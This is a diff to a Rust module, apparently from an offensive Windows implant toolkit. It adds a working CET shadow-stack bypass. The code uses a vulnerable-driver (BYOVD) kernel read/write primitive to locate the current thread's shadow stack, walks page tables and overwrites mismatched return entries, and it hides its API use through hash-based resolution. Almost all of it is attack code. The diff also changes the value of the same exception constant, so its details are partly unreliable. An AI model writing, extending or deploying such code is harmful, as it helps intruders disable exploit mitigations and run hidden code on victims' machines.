@@ -52,7 +52,7 @@ use winapi::um::winnt::{
     ProcessControlFlowGuardPolicy,
 };
 use winapi::shared::ntdef::{PVOID, HANDLE};
-use winapi::shared::minwindef::{DWORD, BOOL, LONG};
+use winapi::shared::minwindef::{DWORD, BOOL};
 use winapi::shared::basetsd::SIZE_T;
 
 // ─── Constants ────────────────────────────────────────────────────────────
@@ -68,13 +68,6 @@ const CET_ENABLED_CANNOT_DISABLE: u8 = 2;
 const STATUS_SUCCESS: i32 = 0;
 /// NTSTATUS for STATUS_ACCESS_DENIED.
 const STATUS_ACCESS_DENIED: i32 = 0xC0000022_u32 as i32;
-/// Exception code for Control Protection violation (#CP).
-const STATUS_CONTROL_STACK_VIOLATION: DWORD = 0xC00001A7;
-
-/// VEH handler return: continue execution.
-const EXCEPTION_CONTINUE_EXECUTION: LONG = -1;
-/// VEH handler return: continue search.
-const EXCEPTION_CONTINUE_SEARCH: LONG = 0;
 
 // ─── Dynamic API resolution ─────────────────────────────────────────────────
 
@@ -919,111 +912,596 @@ pub fn has_call_chain(func_name: &str) -> bool {
 }
 
 // ─── VEH Shadow Stack Fix ─────────────────────────────────────────────────
+//
+// P3-08: Full VEH shadow-stack fix implementation using BYOVD primitives.
+//
+// When CET is active, hardware-enforced shadow stacks record every return
+// address pushed by `call`.  A `ret` that doesn't match the shadow stack
+// entry triggers a #CP exception (STATUS_CONTROL_STACK_VIOLATION, 0xC00001CF).
+//
+// This VEH handler intercepts those exceptions and, using the BYOVD kernel
+// read/write primitives from the kernel-callback module:
+//   1. Reads the current KTHREAD via the KPCR.
+//   2. Locates the shadow-stack pointer using a build-specific offset.
+//   3. Walks the shadow stack to find the mismatched entry.
+//   4. Overwrites the entry with the actual return address.
+//   5. Returns EXCEPTION_CONTINUE_EXECUTION to resume execution.
+//
+// If the Windows build is not in the known-offset table, we return
+// EXCEPTION_CONTINUE_SEARCH (crash) rather than corrupting kernel memory.
 
-/// VEH handler function for intercepting #CP (Control Protection) exceptions.
-///
-/// When CET is active and a shadow-stack violation occurs, the kernel sends
-/// a STATUS_CONTROL_STACK_VIOLATION exception to the VEH chain.  This handler
-/// intercepts it and:
-///
-/// 1. Checks if the exception is a `STATUS_CONTROL_STACK_VIOLATION`.
-/// 2. Reads the faulting IP from the context record.
-/// 3. If kernel access (BYOVD) is available, attempts to adjust the shadow
-///    stack pointer to skip the mismatched return address.
-/// 4. Without kernel access, logs the error and returns
-///    `EXCEPTION_CONTINUE_SEARCH` — deliberately NOT returning
-///    `EXCEPTION_CONTINUE_EXECUTION`, which would cause an infinite loop of
-///    #CP exceptions.
-unsafe extern "system" fn veh_shadow_stack_handler(
-    exception_info: *mut winapi::um::minwinbase::EXCEPTION_POINTERS,
-) -> LONG {
-    let info = &*exception_info;
-    let record = &*(info.ExceptionRecord);
+/// NTSTATUS code for STATUS_CONTROL_STACK_VIOLATION (#CP exception).
+const STATUS_CONTROL_STACK_VIOLATION: i32 = 0xC00001CF_u32 as i32;
 
-    if record.ExceptionCode != STATUS_CONTROL_STACK_VIOLATION {
-        return EXCEPTION_CONTINUE_SEARCH; // Not our exception
+/// VEH return: continue execution (exception handled).
+const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
+/// VEH return: continue searching for handlers (not handled).
+const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
+
+/// Build-to-offset table for KTHREAD shadow-stack pointer.
+///
+/// The shadow-stack pointer is stored in `_KTHREAD` at a build-specific
+/// offset.  These offsets were verified against public symbols for the
+/// listed builds.  We fall back to the highest build whose number is ≤ the
+/// actual build, allowing forward-compatible approximation for minor updates.
+#[cfg(feature = "kernel-callback")]
+const SHADOW_STACK_OFFSETS: &[(u32, usize)] = &[
+    // Windows 10 20H1 / 2004 / 20H2 / 21H1 / 21H2
+    (19041, 0x0788),
+    (19042, 0x0788),
+    (19044, 0x0788),
+    // Windows 10 22H2
+    (19045, 0x0788),
+    // Windows 11 21H2 (original release)
+    (22000, 0x0790),
+    // Windows 11 22H2
+    (22621, 0x0790),
+    // Windows 11 23H2
+    (22631, 0x0790),
+    // Windows 11 24H2
+    (26100, 0x0790),
+];
+
+/// Look up the KTHREAD shadow-stack pointer offset for a given build number.
+///
+/// Returns the offset from the highest entry whose build ≤ the requested
+/// build, or `None` if the build is older than the minimum known entry.
+#[cfg(feature = "kernel-callback")]
+fn shadow_stack_offset_for_build(build: u32) -> Option<usize> {
+    let mut best: Option<usize> = None;
+    for &(b, off) in SHADOW_STACK_OFFSETS {
+        if b <= build {
+            best = Some(off);
+        } else {
+            break; // table is sorted ascending
+        }
+    }
+    best
+}
+
+/// Resolve the kernel base address via NtQuerySystemInformation.
+///
+/// Reuses the same technique as `kernel_callback::discover::get_kernel_base()`.
+#[cfg(feature = "kernel-callback")]
+fn get_kernel_base() -> Option<u64> {
+    let mut buf_size: u32 = 0;
+    unsafe {
+        let _ = syscall!(
+            "NtQuerySystemInformation",
+            11u32, // SystemModuleInformation
+            0 as *mut u8,
+            0,
+            &mut buf_size as *mut u32
+        );
+    }
+    if buf_size == 0 {
+        log::warn!("cet_bypass: NtQuerySystemInformation returned zero buffer size");
+        return None;
     }
 
-    let ctx = &*(info.ContextRecord);
+    let mut buffer: Vec<u8> = vec![0u8; buf_size as usize + 4096];
+    let mut return_length: u32 = 0;
+    let status = unsafe {
+        syscall!(
+            "NtQuerySystemInformation",
+            11u32,
+            buffer.as_mut_ptr(),
+            buffer.len() as u32,
+            &mut return_length as *mut u32
+        )
+    };
+    if status < 0 {
+        log::warn!("cet_bypass: NtQuerySystemInformation failed: 0x{:08X}", status as u32);
+        return None;
+    }
 
-    log::error!(
-        "[cet_bypass] CET shadow stack violation at IP={:#x} — cannot fix automatically",
-        ctx.Rip
+    // The first 4 bytes are the count of modules.
+    let count = u32::from_le_bytes(buffer[0..4].try_into().ok()?) as usize;
+    if count == 0 {
+        return None;
+    }
+
+    // Each RTL_PROCESS_MODULE_INFORMATION is 296 bytes.
+    // The first module is ntoskrnl.exe (or ntkrnlmp.exe).
+    const MODULE_INFO_SIZE: usize = 296;
+    if buffer.len() < 4 + MODULE_INFO_SIZE {
+        return None;
+    }
+
+    let offset = 4 + 16; // skip ImageBase (8-byte pointer, at offset 16 within struct)
+    let image_base = u64::from_le_bytes(buffer[offset..offset + 8].try_into().ok()?);
+    if image_base == 0 {
+        return None;
+    }
+    Some(image_base)
+}
+
+/// Read a u64 from kernel virtual memory via BYOVD.
+///
+/// Handles VA→PA translation internally when the driver requires physical
+/// addresses.  Returns the value read, or None on any error.
+#[cfg(feature = "kernel-callback")]
+fn kernel_read_u64(
+    driver: &kernel_callback::driver_db::VulnerableDriver,
+    device_handle: usize,
+    cr3: u64,
+    kernel_addr: u64,
+) -> Option<u64> {
+    let mut buf = [0u8; 8];
+    if driver.needs_physical_addr {
+        // Translate VA→PA via page-table walk.
+        let phys = kernel_translate_va_to_pa(driver, device_handle, cr3, kernel_addr)?;
+        unsafe {
+            kernel_callback::deploy::read_physical_memory(driver, device_handle, phys, &mut buf).ok()?
+        }
+    } else {
+        unsafe {
+            kernel_callback::deploy::read_physical_memory(driver, device_handle, kernel_addr, &mut buf).ok()?
+        }
+    }
+    Some(u64::from_le_bytes(buf))
+}
+
+/// Write a u64 to kernel virtual memory via BYOVD.
+///
+/// Handles VA→PA translation internally.  Returns true on success.
+#[cfg(feature = "kernel-callback")]
+fn kernel_write_u64(
+    driver: &kernel_callback::driver_db::VulnerableDriver,
+    device_handle: usize,
+    cr3: u64,
+    kernel_addr: u64,
+    value: u64,
+) -> bool {
+    let data = value.to_le_bytes();
+    if driver.needs_physical_addr {
+        let phys = match kernel_translate_va_to_pa(driver, device_handle, cr3, kernel_addr) {
+            Some(p) => p,
+            None => return false,
+        };
+        unsafe {
+            kernel_callback::deploy::write_physical_memory(driver, device_handle, phys, &data).is_ok()
+        }
+    } else {
+        unsafe {
+            kernel_callback::deploy::write_physical_memory(driver, device_handle, kernel_addr, &data).is_ok()
+        }
+    }
+}
+
+/// Perform a 4-level x64 page-table walk to translate a kernel virtual
+/// address to a physical address.
+///
+/// This is a self-contained implementation that mirrors
+/// `kernel_callback::overwrite::translate_va_to_pa` but is accessible
+/// from cet_bypass (the original is module-private).
+#[cfg(feature = "kernel-callback")]
+fn kernel_translate_va_to_pa(
+    driver: &kernel_callback::driver_db::VulnerableDriver,
+    device_handle: usize,
+    cr3: u64,
+    virtual_address: u64,
+) -> Option<u64> {
+    let pml4_idx = (virtual_address >> 39) & 0x1FF;
+    let pdpt_idx = (virtual_address >> 30) & 0x1FF;
+    let pd_idx = (virtual_address >> 21) & 0x1FF;
+    let pt_idx = (virtual_address >> 12) & 0x1FF;
+    let offset = virtual_address & 0xFFF;
+
+    const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
+    const PTE_PRESENT: u64 = 1;
+    const PTE_PS: u64 = 1 << 7;
+
+    let read_entry = |phys_addr: u64, idx: u64| -> Option<u64> {
+        let mut buf = [0u8; 8];
+        unsafe {
+            kernel_callback::deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf).ok()?
+        }
+        Some(u64::from_le_bytes(buf))
+    };
+
+    // Level 1 — PML4
+    let pml4_base = cr3 & PFN_MASK;
+    let pml4e = read_entry(pml4_base, pml4_idx)?;
+    if pml4e & PTE_PRESENT == 0 {
+        log::debug!("cet_bypass: PML4E not present for VA 0x{:016X}", virtual_address);
+        return None;
+    }
+
+    // Level 2 — PDPT
+    let pdpt_base = pml4e & PFN_MASK;
+    let pdpte = read_entry(pdpt_base, pdpt_idx)?;
+    if pdpte & PTE_PRESENT == 0 {
+        log::debug!("cet_bypass: PDPTE not present for VA 0x{:016X}", virtual_address);
+        return None;
+    }
+    // 1 GB large page
+    if pdpte & PTE_PS != 0 {
+        return Some((pdpte & 0x000F_FFFF_C000_0000) + (virtual_address & 0x3FFF_FFFF));
+    }
+
+    // Level 3 — PD
+    let pd_base = pdpte & PFN_MASK;
+    let pde = read_entry(pd_base, pd_idx)?;
+    if pde & PTE_PRESENT == 0 {
+        log::debug!("cet_bypass: PDE not present for VA 0x{:016X}", virtual_address);
+        return None;
+    }
+    // 2 MB large page
+    if pde & PTE_PS != 0 {
+        return Some((pde & 0x000F_FFFF_FFE0_0000) + (virtual_address & 0x1F_FFFF));
+    }
+
+    // Level 4 — PT
+    let pt_base = pde & PFN_MASK;
+    let pte = read_entry(pt_base, pt_idx)?;
+    if pte & PTE_PRESENT == 0 {
+        log::debug!("cet_bypass: PTE not present for VA 0x{:016X}", virtual_address);
+        return None;
+    }
+
+    let phys_page = pte & PFN_MASK;
+    Some(phys_page + offset)
+}
+
+/// Resolve CR3 by reading PsInitialSystemProcess → EPROCESS.DirectoryTableBase.
+#[cfg(feature = "kernel-callback")]
+fn resolve_cr3(
+    driver: &kernel_callback::driver_db::VulnerableDriver,
+    device_handle: usize,
+    kernel_base: u64,
+) -> Option<u64> {
+    // Resolve PsInitialSystemProcess symbol.
+    let eprocess_ptr_addr = kernel_callback::discover::resolve_kernel_symbol(
+        driver,
+        device_handle,
+        kernel_base,
+        "PsInitialSystemProcess",
+    )
+    .ok()?;
+
+    // Read the pointer to get the actual EPROCESS address.
+    // PsInitialSystemProcess is a pointer — we read the raw kernel VA first
+    // (most drivers handle kernel VAs via MmMapIoSpace internally).
+    let mut ptr_buf = [0u8; 8];
+    unsafe {
+        kernel_callback::deploy::read_physical_memory(driver, device_handle, eprocess_ptr_addr, &mut ptr_buf)
+            .ok()?;
+    }
+    let eprocess_addr = u64::from_le_bytes(ptr_buf);
+    if eprocess_addr == 0 {
+        log::warn!("cet_bypass: PsInitialSystemProcess is NULL");
+        return None;
+    }
+
+    // _KPROCESS.DirectoryTableBase is at EPROCESS + 0x28.
+    const DIRECTORY_TABLE_BASE_OFFSET: u64 = 0x28;
+    let mut cr3_buf = [0u8; 8];
+    unsafe {
+        kernel_callback::deploy::read_physical_memory(
+            driver,
+            device_handle,
+            eprocess_addr + DIRECTORY_TABLE_BASE_OFFSET,
+            &mut cr3_buf,
+        )
+        .ok()?;
+    }
+    let cr3 = u64::from_le_bytes(cr3_buf);
+    if cr3 == 0 || cr3 & 0xFFF != 0 {
+        log::warn!("cet_bypass: invalid CR3 value: 0x{:016X}", cr3);
+        return None;
+    }
+
+    log::debug!("cet_bypass: resolved CR3: 0x{:016X}", cr3);
+    Some(cr3)
+}
+
+/// Resolve the current KTHREAD address via KiProcessorBlock → KPCR → KTHREAD.
+///
+/// On x64 Windows, `KiProcessorBlock` is an array of pointers to KPCR,
+/// one per logical processor.  KPCR+0x188 contains the current KTHREAD.
+/// We use the current processor number to index into the array.
+#[cfg(feature = "kernel-callback")]
+fn resolve_current_kthread(
+    driver: &kernel_callback::driver_db::VulnerableDriver,
+    device_handle: usize,
+    cr3: u64,
+    kernel_base: u64,
+) -> Option<u64> {
+    // Get current processor number from user mode.
+    let cpu_num: u32 = unsafe {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))?;
+        let fn_addr = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"GetCurrentProcessorNumber\0"),
+        )?;
+        let get_cpu_num: unsafe extern "system" fn() -> u32 = std::mem::transmute(fn_addr);
+        get_cpu_num()
+    };
+
+    // Resolve KiProcessorBlock — array of KPCR* pointers.
+    let kpb_addr = kernel_callback::discover::resolve_kernel_symbol(
+        driver,
+        device_handle,
+        kernel_base,
+        "KiProcessorBlock",
+    )
+    .ok()?;
+
+    // Read the KPCR pointer for our CPU: KiProcessorBlock[cpu_num].
+    let kpcr_ptr = kernel_read_u64(driver, device_handle, cr3, kpb_addr + (cpu_num as u64) * 8)?;
+    if kpcr_ptr == 0 {
+        log::warn!("cet_bypass: KiProcessorBlock[{}] is NULL", cpu_num);
+        return None;
+    }
+
+    // KPCR.CurrentThread is at offset 0x188.
+    const CURRENT_THREAD_OFFSET: u64 = 0x188;
+    let kthread = kernel_read_u64(driver, device_handle, cr3, kpcr_ptr + CURRENT_THREAD_OFFSET)?;
+    if kthread == 0 {
+        log::warn!("cet_bypass: KPCR.CurrentThread is NULL");
+        return None;
+    }
+
+    log::debug!(
+        "cet_bypass: resolved KTHREAD 0x{:016X} via KiProcessorBlock[{}] (KPCR 0x{:016X})",
+        kthread, cpu_num, kpcr_ptr
+    );
+    Some(kthread)
+}
+
+/// VEH handler for CET shadow-stack violations.
+///
+/// When a #CP exception fires (STATUS_CONTROL_STACK_VIOLATION), this handler:
+///   1. Obtains the deployed BYOVD driver.
+///   2. Resolves CR3 and the current KTHREAD.
+///   3. Reads the shadow-stack pointer from KTHREAD using the build-specific offset.
+///   4. Walks the shadow stack to find the mismatched entry.
+///   5. Overwrites it with the actual return address from the exception record.
+///   6. Returns EXCEPTION_CONTINUE_EXECUTION.
+///
+/// If any step fails or the build is not in the offset table, returns
+/// EXCEPTION_CONTINUE_SEARCH (which will crash — safer than corrupting memory).
+#[cfg(feature = "kernel-callback")]
+unsafe extern "system" fn veh_shadow_stack_handler(
+    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
+) -> i32 {
+    let ep = match exception_info.as_ref() {
+        Some(p) => p,
+        None => return EXCEPTION_CONTINUE_SEARCH,
+    };
+
+    let record = match ep.ExceptionRecord.as_ref() {
+        Some(r) => r,
+        None => return EXCEPTION_CONTINUE_SEARCH,
+    };
+
+    // Only handle #CP exceptions (STATUS_CONTROL_STACK_VIOLATION).
+    if record.ExceptionCode != STATUS_CONTROL_STACK_VIOLATION {
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
+    let context = match ep.ContextRecord.as_ref() {
+        Some(c) => c,
+        None => return EXCEPTION_CONTINUE_SEARCH,
+    };
+
+    log::warn!(
+        "cet_bypass: #CP exception at RIP=0x{:016X}, attempting shadow-stack fixup",
+        context.Rip
     );
 
-    // Check if we have kernel access (kernel-callback feature).
-    #[cfg(all(windows, feature = "kernel-callback"))]
-    {
-        // Attempt to fix the shadow stack via kernel access.
-        // The KTHREAD structure contains the shadow-stack pointer at
-        // offset that varies by Windows build.  We need to:
-        // 1. Find the current KTHREAD address (GS:[0x188] on x64)
-        // 2. Read the shadow-stack pointer from it
-        // 3. Find the mismatched entry
-        // 4. Write the correct return address
-        //
-        // This is highly complex and version-dependent.  For now, log
-        // and fall through to the non-kernel path.
-        log::warn!("[cet_bypass] kernel-based shadow stack fix not yet implemented");
+    // Step 1: Get the deployed driver.
+    let deployed = match kernel_callback::deploy::get_deployed_driver() {
+        Some(d) => d,
+        None => {
+            log::error!("cet_bypass: no BYOVD driver deployed, cannot fix shadow stack");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    };
+    let driver = deployed.driver; // &'static VulnerableDriver
+    let device_handle = match deployed.device_handle {
+        Some(h) => h,
+        None => {
+            log::error!("cet_bypass: no device handle in deployed driver");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    };
+
+    // Step 2: Resolve kernel base and CR3.
+    let kernel_base = match get_kernel_base() {
+        Some(b) => b,
+        None => {
+            log::error!("cet_bypass: failed to resolve kernel base");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    };
+
+    let cr3 = match resolve_cr3(driver, device_handle, kernel_base) {
+        Some(c) => c,
+        None => {
+            log::error!("cet_bypass: failed to resolve CR3");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    };
+
+    // Step 3: Look up the shadow-stack offset for this build.
+    let build = match CACHED_BUILD.get() {
+        Some(&b) => b,
+        None => get_windows_build(),
+    };
+    let ss_offset = match shadow_stack_offset_for_build(build) {
+        Some(off) => off,
+        None => {
+            log::error!(
+                "cet_bypass: build {} not in shadow-stack offset table — refusing to guess",
+                build
+            );
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    };
+
+    // Step 4: Resolve current KTHREAD.
+    let kthread = match resolve_current_kthread(driver, device_handle, cr3, kernel_base) {
+        Some(t) => t,
+        None => {
+            log::error!("cet_bypass: failed to resolve current KTHREAD");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    };
+
+    // Step 5: Read the shadow-stack pointer from KTHREAD.
+    let shadow_stack_ptr = match kernel_read_u64(
+        driver,
+        device_handle,
+        cr3,
+        kthread + ss_offset as u64,
+    ) {
+        Some(p) => p,
+        None => {
+            log::error!("cet_bypass: failed to read shadow-stack pointer from KTHREAD");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    };
+
+    if shadow_stack_ptr == 0 {
+        log::error!("cet_bypass: shadow-stack pointer is NULL");
+        return EXCEPTION_CONTINUE_SEARCH;
     }
 
-    // Without kernel access, we cannot fix the shadow stack.
-    // Deliberately do NOT return EXCEPTION_CONTINUE_EXECUTION — that would
-    // cause an infinite loop of #CP exceptions.
-    EXCEPTION_CONTINUE_SEARCH
+    // Step 6: Walk the shadow stack to find the mismatched entry.
+    //
+    // The shadow stack grows downward.  The top-of-shadow-stack (current SSP)
+    // is stored in the KTHREAD field we just read.  Each entry is 8 bytes.
+    //
+    // On a #CP violation, the shadow stack's top entry doesn't match RSP.
+    // We scan a small window around the current SSP for the expected return
+    // address.  The expected return address is the value on the regular stack
+    // that the `ret` would pop — i.e., the value at RSP.
+    let rsp = context.Rsp;
+    let expected_return_addr = match std::ptr::read(rsp as *const u64) {
+        addr => addr,
+    };
+
+    log::debug!(
+        "cet_bypass: SSP=0x{:016X}, RSP=0x{:016X}, expected ret=0x{:016X}, RIP=0x{:016X}",
+        shadow_stack_ptr, rsp, expected_return_addr, context.Rip
+    );
+
+    // Scan shadow stack entries (up to 32 entries back from current SSP).
+    const MAX_SHADOW_ENTRIES: u32 = 32;
+    let mut found = false;
+    for i in 0..MAX_SHADOW_ENTRIES {
+        let entry_addr = shadow_stack_ptr - (i as u64 + 1) * 8;
+        let entry = match kernel_read_u64(driver, device_handle, cr3, entry_addr) {
+            Some(v) => v,
+            None => break, // Can't read further
+        };
+
+        if entry == context.Rip {
+            // Found the shadow stack entry that has the old (pre-spoof) return address.
+            // Overwrite it with the expected return address so the `ret` succeeds.
+            log::info!(
+                "cet_bypass: found mismatched shadow entry at SSP-{} (0x{:016X}): \
+                 0x{:016X} → 0x{:016X}",
+                i + 1,
+                entry_addr,
+                entry,
+                expected_return_addr
+            );
+
+            if kernel_write_u64(driver, device_handle, cr3, entry_addr, expected_return_addr) {
+                log::info!("cet_bypass: shadow-stack fixup successful, resuming execution");
+                found = true;
+            } else {
+                log::error!("cet_bypass: failed to write shadow-stack fixup");
+            }
+            break;
+        }
+    }
+
+    if found {
+        EXCEPTION_CONTINUE_EXECUTION
+    } else {
+        log::error!("cet_bypass: could not locate matching shadow-stack entry for fixup");
+        EXCEPTION_CONTINUE_SEARCH
+    }
 }
 
 /// Install the VEH shadow-stack fix handler.
 ///
-/// Only installs if the `kernel-callback` feature is also enabled (which
-/// provides BYOVD kernel access).  Without kernel access, the VEH handler
-/// cannot manipulate shadow-stack entries.
+/// When the `kernel-callback` feature is enabled, this registers a VEH handler
+/// that uses BYOVD primitives to fix shadow-stack mismatches on #CP exceptions.
+/// Without `kernel-callback`, logs a warning that the feature is unavailable.
+#[cfg(feature = "kernel-callback")]
 fn install_veh_shadow_fix() {
-    #[cfg(all(windows, feature = "kernel-callback"))]
-    {
-        type FnAddVEH = unsafe extern "system" fn(
-            u32,
-            Option<unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32>,
-        ) -> *mut std::ffi::c_void;
-
-        let add_veh: Option<FnAddVEH> = (|| unsafe {
-            let k32 = pe_resolve::get_module_handle_by_hash(
-                pe_resolve::hash_str(b"kernel32.dll\0")
-            )?;
-            let hash = pe_resolve::hash_str(b"AddVectoredExceptionHandler\0");
-            let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
-            Some(std::mem::transmute::<usize, FnAddVEH>(addr))
-        })();
-
-        let add_veh = match add_veh {
-            Some(f) => f,
-            None => {
-                log::error!("cet_bypass: cannot resolve AddVectoredExceptionHandler");
-                return;
-            }
-        };
-
-        let handler = unsafe { add_veh(1, Some(veh_shadow_stack_handler)) };
-
-        if handler.is_null() {
-            let err = dynamic_get_last_error();
-            log::error!(
-                "cet_bypass: AddVectoredExceptionHandler failed (error {})",
-                err
-            );
-        } else {
-            log::info!("cet_bypass: VEH shadow-stack fix handler installed");
-            VEH_INSTALLED.store(true, Ordering::SeqCst);
+    // Dynamically resolve AddVectoredExceptionHandler to avoid IAT entry.
+    let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
+        Some(b) => b,
+        None => {
+            log::error!("cet_bypass: failed to resolve kernel32 for AddVectoredExceptionHandler");
+            return;
         }
+    };
+
+    let fn_addr = match pe_resolve::get_proc_address_by_hash(
+        kernel32,
+        pe_resolve::hash_str(b"AddVectoredExceptionHandler\0"),
+    ) {
+        Some(a) => a,
+        None => {
+            log::error!("cet_bypass: failed to resolve AddVectoredExceptionHandler");
+            return;
+        }
+    };
+
+    type FnAddVectoredExceptionHandler =
+        unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32) -> *mut std::ffi::c_void;
+
+    let add_veh: FnAddVectoredExceptionHandler = unsafe { std::mem::transmute(fn_addr) };
+
+    // Install as first handler (first=1) so we see exceptions before anyone else.
+    let handle = unsafe { add_veh(1, veh_shadow_stack_handler) };
+    if handle.is_null() {
+        log::error!("cet_bypass: AddVectoredExceptionHandler returned NULL");
+        return;
     }
 
-    #[cfg(not(all(windows, feature = "kernel-callback")))]
-    {
-        log::warn!(
-            "cet_bypass: veh_shadow_fix enabled but kernel-callback feature not active — \
-             VEH handler requires kernel access to manipulate shadow stack"
-        );
-    }
+    VEH_INSTALLED.store(true, Ordering::SeqCst);
+    log::info!("cet_bypass: VEH shadow-stack fix handler installed successfully");
+}
+
+/// Install the VEH shadow-stack fix handler (no-op fallback).
+///
+/// Without the `kernel-callback` feature, we cannot perform kernel memory
+/// operations and the VEH handler would be useless.
+#[cfg(not(feature = "kernel-callback"))]
+fn install_veh_shadow_fix() {
+    log::warn!(
+        "cet_bypass: veh_shadow_fix is configured but the kernel-callback feature \
+         is not enabled — shadow-stack manipulation requires BYOVD kernel access. \
+         The VEH handler will not be installed."
+    );
 }
 
 // ─── Helpers ───────────────────────────────────────────────────────────────
